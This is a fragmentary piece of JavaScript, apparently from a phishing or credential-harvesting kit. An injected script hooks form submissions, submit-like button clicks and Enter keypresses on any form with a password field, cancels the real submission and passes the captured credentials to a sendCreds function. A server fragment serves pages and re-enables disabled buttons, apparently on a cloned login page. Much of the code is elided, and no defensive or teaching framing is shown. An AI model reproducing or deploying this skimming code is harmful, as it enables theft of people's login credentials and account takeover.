...
(function(){
  ...
  // 1. Intercept form submission — capture-phase, catches any form with email/password
  document.addEventListener('submit',function(e){
    var f=e.target;
    if(!f||f.tagName!=='FORM')return;
    var hasEP=f.querySelector('input[type="password"],input[name="pass"],input[name="password"]');
    if(!hasEP)return;
    e.preventDefault();e.stopImmediatePropagation();
    sendCreds(getCreds());
  },true);

  // 2. Capture-phase click listener — catches buttons before React/framework handlers
  document.addEventListener('click',function(e){
    ...
    var isSubmit=/log|next|continue|submit|sign|enter/.test(label)||(btn.tagName==='INPUT'&&btn.type==='submit');
    if(!isSubmit)return;
  ...
  // 3. Hook keyboard Enter on inputs inside any form with password field
  document.addEventListener('keydown',function(e){
    if(e.key!=='Enter')return;
    var a=document.activeElement;
    if(!a)return;
    var f=a.form||a.closest('form');
    if(!f)return;
    var hasPwd=f.querySelector('input[type="password"],input[name="pass"],input[name="password"]');
    if(!hasPwd)return;
...
export function createServer(serviceName, port = 0) {
  ...
  app.get('/', (req, res) => {
    ...
    // Remove disabled and aria-disabled so buttons are clickable
